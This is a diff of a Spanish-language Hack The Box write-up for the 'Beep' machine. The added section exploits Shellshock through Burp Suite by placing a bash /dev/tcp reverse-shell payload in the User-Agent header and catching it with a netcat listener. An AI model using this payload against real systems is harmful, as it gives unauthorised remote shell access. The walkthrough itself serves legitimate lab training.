@@ -220,11 +220,35 @@ Lo más cómodo sería realizar este ataque desde nuestra terminal, sin embargo,
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/24.png)
 
-Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga `curl`, concretamente el parámetro `-k` o `insecure`, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así nos es posible explotar el `shellshock` de esta forma, por lo que tendremos que hacerlo de otra forma.
+Este error lo podríamos solucionar utilizando uno de los parámetros que nos otorga `curl`, concretamente el parámetro `-k` o `--insecure`, el cual permite tramitar este tipo de peticiones inseguras. Sin embargo, ni así, nos es posible explotar el `shellshock` de esta forma, por lo que tendremos que hacerlo de otra manera.
 
 ![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/25.png)
 
-Otra manera 
+Para poder cambiar el `User-Agent` de otra forma, podríamos hacerlo a través de `Burp Suite`, y así, entablarnos una `reverse shell`.
+
+Primero vamos a emitir una petición al panel de autenticación con credenciales al azar, y posteriormente, desde `Burp Suite`, con `Ctrl + R`, vamos a mandar nuestra petición al `Repeater`.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/26.png)
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/27.png)
+
+Después, vamos a borrar el contenido que se encuentra en el campo `User-Agent`, y lo vamos a reemplazar con nuestro código malicioso. Para variar un poco, la `reverse shell` la conseguiremos a través de bash, a diferencia de como lo hicimos en la explotación del servicio `Webmin`; nuevamente, este tipo de `reverse shells`, las podemos conseguir [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
+
+En primer lugar, desde nuestra máquina de atacantes, a través de `NetCat`, tenemos que ponernos en escucha a través de un puerto cualquiera.
+  
+``` 
+sudo nc -nlvp <puertoCualquiera>
+```
+
+Y, el código malicioso que vamos a ingresar en el campo `User-Agent` será: 
+
+```
+() { :; }; bash -i >& /dev/tcp/<nuestraIP>/<puertoCualquiera> 0>&1
+```
+
+Finalmente, presionaremos el botón `Send`, para que emitir nuestra petición.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-06-Beep-Hack-The-Box/28.png)
 
 ### [](#header-4)Fase De Explotación - File Upload Bypass
 
